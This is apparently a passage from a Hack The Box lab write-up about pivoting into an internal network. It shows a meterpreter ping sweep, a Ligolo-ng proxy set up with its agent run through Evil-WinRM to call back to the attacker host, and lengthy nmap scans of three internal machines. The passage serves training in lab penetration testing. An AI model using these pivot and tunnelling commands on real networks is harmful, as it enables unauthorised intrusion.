Now I will use my connection from meterpreter and run a PINGSWEEP scan in order to determine which other machines are available on the internal network NIC:

```
msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 192.168.21.0/24
[+] 	192.168.21.10 host found  --> Internal NIC DMZ
[+] 	192.168.21.11 host found
[+] 	192.168.21.13 host found
[+] 	192.168.21.12 host found
[+] 	192.168.21.255 host found --> Broadcast IP
[*] Post module execution completed
```

Knowing from the challenge that we have only 4 server this should be enought! Here I will upload Linogolo-ng client and connect to the machine to create a SSLVPN proxy like so we can reach the internal network via DMZ pivot.

```
//Server Proxy
┌──(root㉿kali)-[/home/…/Downloads/Tools/Ligolo-NG/ligolo-ng_proxy_0.5.1_linux_amd64]
└─# ./proxy -selfcert -laddr 0.0.0.0:443
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0008] Agent joined.                                 name="ONLINE\\elpenor@online" remote="10.13.38.21:49756"
ligolo-ng » 
ligolo-ng » session 
? Specify a session : 1 - #1 - ONLINE\elpenor@online - 10.13.38.21:49756
[Agent : ONLINE\elpenor@online] » start 
[Agent : ONLINE\elpenor@online] » INFO[0197] Starting tunnel to ONLINE\elpenor@online     




//Victim
*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> ./agent -connect 10.10.14.5:443 -ignore-cert
agent.exe : time="2024-01-12T04:28:59-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2024-01-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2024-01-12T04:28:59-08:00" level=info msg="Connection established" addr="10.10.14.5:443"
```

&nbsp;

* * *

## Host enumeration

Now we should be able to run a NMAP enumeration on the 3 other IP we found out!

- **192.168.21.11**:
    
    ```
    PORT     STATE SERVICE REASON         VERSION
    22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 71:9d:1d:60:78:3b:46:5d:14:b2:78:00:dc:9c:67:f8 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtwTjpiA1FhtBsRQ2NnURP/VpwlTYAgm+LihfNqsYMZKxyJO2dkaiStUwANtykYmVZ52kHfMHkFJx7YhaZlftRX7ND6pGYyuJxCQyvEWa9Pm26UkBgX5OQxw5uFDMTlRaEI4qYEyYwd7VNCjcRpTaa06ickBlu4/SQflzewgqQ8Hh00c2OWK+upQcTIqnfNBnV3r7Wz1QaieqmD0SkPn32UFwUGhFU7HVs5PPwyt31OfQVwB8JdusoVz3lotrMkb0SRWAlIOlI2uDy1Zn6xLWRiC9vXUgCwZL9myoJbnp2pkSV9uKIXuDcWj3n16/MSnFuwuX+ic8x/NbstsWo9nxX2bSXDNCiEMZji7tkUAaimgYiihVaOLPqVDBiEZd4BOcrNRjviSR7t1MXEyOQD2P6/UvsBGLKT/RaeAO9lRHcE3dfTsKjJNunz9NY/0dNHc7VjWtWHkZn/3OpWDXliCirjHsXR/1SuViESJsGOKqc4Y3lq68Fa2Q7psucoy7tUlU=
    |   256 5a:f6:a7:43:df:82:a2:00:56:ad:c7:fd:8d:e1:d7:28 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFNYfQA+R+kXjdouK/bKJ0fkb2HzTKMXnSDPe9iEdpYjvPE5hhtiq7oOjr+TBdd8VrNUusWn0HJw8BzN1Xiwe4M=
    |   256 de:6b:7f:39:91:1b:21:aa:2f:13:1b:a0:1c:39:d1:72 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAbyM/QegifMuAM1SdbDANQO2R/XghFMbsNjcwoAUQmN
    3000/tcp open  http    syn-ack ttl 64 Node.js (Express middleware)
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    5000/tcp open  upnp?   syn-ack ttl 64
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Cache-Control: no-cache
    |     Date: Fri, 12 Jan 2024 11:40:31 GMT
    |     Content-Length: 0
    |   HTTPOptions: 
    |     HTTP/1.0 200 OK
    |     Cache-Control: no-cache
    |     Date: Fri, 12 Jan 2024 11:40:46 GMT
    |_    Content-Length: 0
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    ```
    
- **192.168.21.12**:
    
    ```
    3000/tcp  open  ppp?          syn-ack ttl 64
    | fingerprint-strings: 
    |   GetRequest, HTTPOptions: 
    |     HTTP/1.1 200 OK
    |     X-XSS-Protection: 1
    |     X-Instance-ID: bo9CugcPKaEWQe7w3
    |     Content-Type: text/html; charset=utf-8
    |     Vary: Accept-Encoding
    |     Date: Fri, 12 Jan 2024 11:46:09 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html>
    |     <head>
    |     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
    |     <meta charset="utf-8" />
    |     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    |     <meta http-equiv="expires" content="-1" />
    |     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    |     <meta name="fragment" content="!" />
    |     <meta name="distribution" content="global" />
    |     <meta name="rating" content="general" />
    |     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    |     <meta name="mobile-web-app-capable" content="yes" />
    |     <meta name="apple-mobile-web-app-capable" conten
    |   Help, NCP: 
    |_    HTTP/1.1 400 Bad Request
    5039/tcp  open  ssl/asterisk  syn-ack ttl 64 Asterisk Call Manager 5.0.0
    | ssl-cert: Subject: commonName=HTB/organizationName=HackTheBox/stateOrProvinceName=Athens/countryName=GR/localityName=Piraeus/emailAddress=ch4p@odyssey.htb
    | Issuer: commonName=HTB/organizationName=HackTheBox/stateOrProvinceName=Athens/countryName=GR/localityName=Piraeus/emailAddress=ch4p@odyssey.htb
    | Public Key type: rsa
    | Public Key bits: 4096
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-04-18T13:45:50
    | Not valid after:  2020-05-18T13:45:50
    | MD5:   f59d:fb25:8455:4019:da11:39ee:a794:3de7
    | SHA-1: 8c0b:dfef:a2c5:b2ec:4ce0:a699:a70d:d9dd:2cbc:bc9a
    |_ssl-date: TLS randomness does not represent time
    8080/tcp  open  http-proxy    syn-ack ttl 64
    |_http-title: Odyssey
    |_http-open-proxy: Proxy might be redirecting requests
    | http-methods: 
    |_  Supported Methods: GET HEAD
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 404 Not Found
    |     Content-Type: text/html; charset=UTF-8
    |     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
    |     Set-Cookie: i_like_gogs=10edb6753a6d2445; Path=/; HttpOnly
    |     Set-Cookie: _csrf=7YdElKRl9e04Muo9NXAgJTO9PKY6MTcwNTA1OTk2NTYzNzQ3MjMxNA; Path=/; Domain=localhost; Expires=Sat, 13 Jan 2024 11:46:05 GMT; HttpOnly
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:05 GMT
    |     <!DOCTYPE html>
    |     <html>
    |     <head data-suburl="">
    |     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    |     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    |     <meta name="author" content="Gogs" />
    |     <meta name="description" content="Gogs is a painless self-hosted Git service" />
    |     <meta name="keywords" content="go, git, self-hosted, gogs">
    |     <meta name="referrer" content="no-referrer" />
    |     <meta name="_csrf" content="7YdElKRl9e04Muo9NXAgJTO9PKY6MTcwNTA1OTk2NTYzNzQ3MjMxNA" />
    |     <meta
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Content-Type: text/html; charset=UTF-8
    |     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
    |     Set-Cookie: i_like_gogs=f8a17ed4947b64d5; Path=/; HttpOnly
    |     Set-Cookie: _csrf=xUvNP1VklZ8UYNZ4U_hZqicqQ7Y6MTcwNTA1OTk2NTI1NDYxNDc0OA; Path=/; Domain=localhost; Expires=Sat, 13 Jan 2024 11:46:05 GMT; HttpOnly
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:05 GMT
    |     <!DOCTYPE html>
    |     <html>
    |     <head data-suburl="">
    |     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    |     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    |     <meta name="author" content="Gogs" />
    |     <meta name="description" content="Gogs is a painless self-hosted Git service" />
    |     <meta name="keywords" content="go, git, self-hosted, gogs">
    |     <meta name="referrer" content="no-referrer" />
    |     <meta name="_csrf" content="xUvNP1VklZ8UYNZ4U_hZqicqQ7Y6MTcwNTA1OTk2NTI1NDYxNDc0OA" />
    |     <meta name="
    |   HTTPOptions: 
    |     HTTP/1.0 500 Internal Server Error
    |     Content-Type: text/plain; charset=utf-8
    |     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:05 GMT
    |     Content-Length: 108
    |     template: base/footer:15:47: executing "base/footer" at <.PageStartTime>: invalid value; expected time.Time
    |   RTSPRequest: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |_    Request
    10022/tcp open  ssh           syn-ack ttl 64 OpenSSH 8.1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 90:32:c4:f8:e8:0f:41:4c:57:ea:64:dd:c0:c7:83:fc (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCbHIg+o1DgVsX6Jidl1u9evQ9PkoT8/X9IQmuxfpskPfe1/k3fJw4hY6zdeZhozr1YlMvlJZT73H3hvQ0OeJ89Yv/OSE2WJGPZrQ0OftPJZft5LAZownjIfI3FkTlh3K7CkahepR+FfllnC7sFWcXiPgLradPNtbDiax33193t/2udAwDU+admeSXkIDlsYLETSza9I+hd/pgV/0uGZt2H7hksDEGQmqn7c8buUZSokteOspzZjbD3Dm6gIryUXrc/KCiduQOGjz/mz0Af8qNlUHX5hxiGHR8up5k+o9S0sHj1nWx9a8G0SGXZa86oSZrTIy3gUa0bipDifx6FwHQ2t5sDlBM7oJzXIxftOKQHQQkZpvApMASSWXRolQHu9w3RcC/sM5PVUncg7N6mgpFsiwh2EcBOze0LyQcpEfvYsC42r02A1LpfOZXMj5uq5WY9jYDEWHn3mv1jSbe1Ofw8idiShsA5Stcx9+vnGc/fFBT4Dz0trBFuEx6Z8NBTfUs=
    |   256 76:c9:ef:38:1d:9d:de:fb:93:01:cf:60:d9:16:0e:92 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMBGWEtZNz9vnhdKYMHlx98o2a/Gnce07uF5GjTQEHNwsUDbPtq7y6m5UmbhgDptR1ffx+0GeTr0JZyOjhjU7Sw=
    |   256 c1:58:53:71:a2:16:74:4f:c2:ed:60:49:19:b6:78:41 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMOihQ3/ZScGhO7XepyhWVuSvDtpnl0kWB2ZD6rVAI4P
    10250/tcp open  ssl/http      syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    | ssl-cert: Subject: commonName=odyssey@1616498255
    | Subject Alternative Name: DNS:odyssey
    | Issuer: commonName=odyssey-ca@1616498255
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2021-03-23T10:17:33
    | Not valid after:  2022-03-23T10:17:33
    | MD5:   6ccf:9a35:58cb:fa78:d19e:de51:9830:8d1b
    | SHA-1: f3c3:1e80:ddf1:f856:caa4:e165:8993:303a:3647:8bbb
    |_ssl-date: TLS randomness does not represent time
    10255/tcp open  http          syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    10257/tcp open  ssl/unknown   syn-ack ttl 64
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    | ssl-cert: Subject: commonName=localhost@1705029261
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Issuer: commonName=localhost-ca@1705029260
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2024-01-12T02:14:18
    | Not valid after:  2025-01-11T02:14:18
    | MD5:   df9c:243e:63b7:6424:2d09:01b1:436e:ee9b
    | SHA-1: e59a:553d:914b:19bd:eb91:0d6f:d963:3620:4aec:1297
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:16 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:17 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    10259/tcp open  ssl/unknown   syn-ack ttl 64
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:16 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Fri, 12 Jan 2024 11:46:17 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    | ssl-cert: Subject: commonName=localhost@1705029259
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Issuer: commonName=localhost-ca@1705029258
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2024-01-12T02:14:17
    | Not valid after:  2025-01-11T02:14:17
    | MD5:   43a7:2baf:4a15:d0d6:f1d0:e2e6:0342:1241
    | SHA-1: f423:49a8:dddd:7446:cf66:2ea8:3844:4486:a91d:151b
    16443/tcp open  ssl/unknown   syn-ack ttl 64
    | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB/localityName=Canonical/organizationalUnitName=Canonical
    | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:192.168.21.12, IP Address:172.17.0.1, IP Address:10.1.148.128
    | Issuer: commonName=10.152.183.1
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2024-01-12T03:14:10
    | Not valid after:  2025-01-11T03:14:10
    | MD5:   0f61:4794:09ed:5eea:f78b:c2dd:1632:0e7a
    | SHA-1: 1bed:0539:f2ee:f400:4e71:106c:3242:dd76:35d5:a5b8
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Fri, 12 Jan 2024 11:46:44 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Fri, 12 Jan 2024 11:46:16 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   HTTPOptions: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Fri, 12 Jan 2024 11:46:17 GMT
    |     Content-Length: 129
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    25000/tcp open  icl-twobase1? syn-ack ttl 64
    ```
    
- **192.168.21.13**:
    
    ```
    PORT      STATE SERVICE        REASON         VERSION
    22/tcp    open  ssh            syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
    111/tcp   open  rpcbind        syn-ack ttl 64 2-4 (RPC #100000)
    515/tcp   open  printer?       syn-ack ttl 64
    6787/tcp  open  ssl/http       syn-ack ttl 64 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
    |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    | http-title: Solaris Dashboard
    |_Requested resource was https://192.168.21.13:6787/solaris/
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=dev
    | Subject Alternative Name: DNS:dev
    | Issuer: commonName=dev/organizationName=Host Root CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2021-03-17T14:05:00
    | Not valid after:  2031-03-15T14:05:00
    | MD5:   910b:19ac:5d99:bc1c:06d4:f580:36b7:30d4
    | SHA-1: 0fb1:8c22:9491:ca96:2a76:cf22:902e:0903:7711:24c2
    | -----BEGIN CERTIFICATE-----
    | MIIC1zCCAcGgAwIBAgIHAIJdlpff8TALBgkqhkiG9w0BAQswJTEVMBMGA1UEChMM
    | SG9zdCBSb290IENBMQwwCgYDVQQDEwNkZXYwHhcNMjEwMzE3MTQwNTAwWhcNMzEw
    | MzE1MTQwNTAwWjAOMQwwCgYDVQQDEwNkZXYwggEiMA0GCSqGSIb3DQEBAQUAA4IB
    | DwAwggEKAoIBAQCu6/kVGLJToRz7In64dwp0665amU2Pkj4GDZxD7kqbPX6z7fjp
    | BXfcJysV/vLEgT3yAxgXuI/XggXB4+HuCqk98LlSVem0r+G9tcA1sMXeFChEjoVF
    | E1fuSHy0/9nNzhEM8IoROiNNmWEum7im075DvwrVWRwL6JOqi4o2EOueGh9Ob8pI
    | l0Jb6CqVX6Af9j/vwA7l5iryQyv7sQPPXgegsmYOAP3OFNzI6x9VeV59cZknoLwx
    | U+HJ2bQ/VpKRSLXZv6hyOf5fNdiXLY4Rpc5/Ce6o65MfCgXqZSRjA8S3NPZQGpna
    | naYtf5/cY59CrEtWb2oripxP44Bb5vChAesbAgMBAAGjJzAlMA4GA1UdEQQHMAWC
    | A2RldjATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsDggEBAFQG+0uU
    | L3nNMj4/PNX/jadovBt+3DokgGPqSlHM/kDPOHtrKe02ehhJSlxiyqBkdNOudDb1
    | 5ksJL9Wxz13sLpZTdrTbCP8k+UzufTdVdXw8Xjo3NGQAZBu4PQLI6EoaZH2tUkRp
    | 6b2GMhUJRL+EEwoEr+sCy13VstdfGCJzwhyEPkUV0t2ZtqLAKRv/WEhIHiTsz6XH
    | 2UyzA9oPCFWtdUaT7K5K/l/YqMJorXWdnHkNHs8TMzitXvVVaNX+ZCjGaKGlCYRD
    | 5aoeIUG26C4bc0ojfWCh/nCXoc3sCVjgwtnRB/LlAaiLqY3Xmcb06n02HwoDagjL
    | wLgsjBIuH7yE+v4=
    |_-----END CERTIFICATE-----
    6788/tcp  open  smc-http?      syn-ack ttl 64
    6789/tcp  open  ibm-db2-admin? syn-ack ttl 64
    12302/tcp open  rads?          syn-ack ttl 64
    ```
    

So far here I identified:

- .13=solaris (DEV02)
- .12=voip (VOIP)
- .11=ubuntu (DEV01)

&nbsp;

I will continue to singular machine pages with in dept analysis and explorations.

&nbsp;